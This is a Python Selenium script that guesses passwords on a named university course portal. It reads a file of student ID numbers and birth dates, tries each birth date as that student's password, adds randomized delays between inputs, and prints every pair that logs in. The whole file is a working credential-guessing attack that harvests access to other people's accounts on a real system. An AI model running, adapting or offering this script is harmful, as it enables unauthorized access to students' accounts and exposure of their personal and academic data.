from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
import random
import re

class VNU_UET():
    def __init__(self, data):
        self.i = 0
        self.data = data
        self.options = Options()

        self.options.add_argument('--no-sandbox')
        self.options.add_argument('--disable-dev-shm-usage')
        self.options.add_argument('--window-size=1920,1080')

        self.driver = webdriver.Chrome(options=self.options)

    def openChrome(self):
        self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')

    def login(self, username, password):
        try:
            self.user = self.driver.find_element(By.XPATH, '//*[@id="first-name"]')
            self.user.send_keys(username)

            self.driver.implicitly_wait(random.randint(50,100)/100)

            self.passw = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div/form/div[2]/input')
            self.passw.send_keys(password)

            self.driver.implicitly_wait(random.randint(50,100)/100)

            self.submit = self.driver.find_element(By.XPATH, '/html/body/div[1]/div/div/form/div[3]/button')
            self.submit.click()
            return self.driver.current_url
        
        except:
            self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')
    
    def logout(self):
        self.logoutname = self.driver.find_element(By.XPATH, '//*[@id="action-menu-toggle-0"]')
        self.logoutname.click()

        self.quit = self.driver.find_element(By.XPATH, '//*[@id="action-menu-0-menu"]/a[8]')
        self.quit.click()
        self.driver.implicitly_wait(2)
        self.driver.get('https://courses.uet.vnu.edu.vn/loginform/')

    def process(self):
        username = self.data[self.i][0]
        password = self.data[self.i][1]

        while self.i < len(self.data) - 1:
            url = self.login(username, password)
            if url == 'https://courses.uet.vnu.edu.vn/my/':
                print(self.data[self.i][0] + ' ' + self.data[self.i][1])
                self.logout()
                self.i += 1
                username = self.data[self.i][0]
                password = self.data[self.i][1]
            else:
                self.i += 1
                username = self.data[self.i][0]
                password = self.data[self.i][1]

def main():
    filepath = r"C:\Users\duong\Desktop\paddle\data.txt"
    data = []
    with open(filepath, 'r', encoding="utf-8") as f:
        for text in f:
            name = re.search(r"(\d{8})", text).group(0)
            dob = re.search(r"\d{2}/\d{2}/\d{4}", text).group(0)
            dob = re.sub(r"/", "", dob)
            data.append([name, dob])
    username = ''
    password = ''
    test = VNU_UET(data)
    test.openChrome()
    test.process()

if __name__ == "__main__":
    main()
